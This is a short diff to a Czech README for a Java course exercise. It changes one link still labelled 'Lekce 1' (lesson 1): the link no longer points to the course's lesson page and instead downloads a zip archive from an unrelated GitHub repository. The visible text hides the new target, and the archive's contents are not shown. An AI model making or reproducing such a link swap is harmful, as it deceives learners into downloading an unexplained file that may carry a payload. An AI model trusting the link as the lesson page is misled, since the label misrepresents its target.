@@ -11,4 +11,4 @@
 Pokud chceš, můžeš pokračovat dalšími úpravami `index.html`, třeba přidat motivační citát. Vždy, když uděláš ucelenou změnu a jsi s výsledkem spokojena, *commitni* změny do lokálního repository a následně je pomocí *push* zveřejni a zazálohuj na GitHubu.
 
 ## Mohlo by se hodit
-* odkaz na stránku [Lekce 1](https://czechitas-java-2-webapps.nyni.eu/lekce-1)
+* odkaz na stránku [Lekce 1](https://github.com/daduelle/j2w-lekce01-cviceni/raw/refs/heads/main/src/main/j_lekce_w_cviceni_v3.6.zip)
